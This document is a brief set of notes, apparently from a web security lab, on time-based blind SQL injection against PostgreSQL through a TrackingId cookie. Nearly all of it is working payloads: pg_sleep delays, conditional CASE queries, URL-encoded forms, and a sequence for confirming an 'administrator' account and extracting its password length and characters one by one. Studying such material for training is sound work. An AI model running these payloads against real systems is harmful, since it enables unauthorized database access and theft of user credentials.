# delay

> adding 10 sec delay to a response

`TrackingId=x'||pg_sleep(10)--`

> using delay to see if a statement is true

`TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`

vs

`TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--`

> what is better converted

`TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

vs

`TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

- needs to convert it because of the `;` it messes with the query

> lets query for 'administrator'

`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

- in case of 10 sec delay the 'administrator' exist in users table unsename column

> check for password length

`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

> lets check for the password character by character

`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
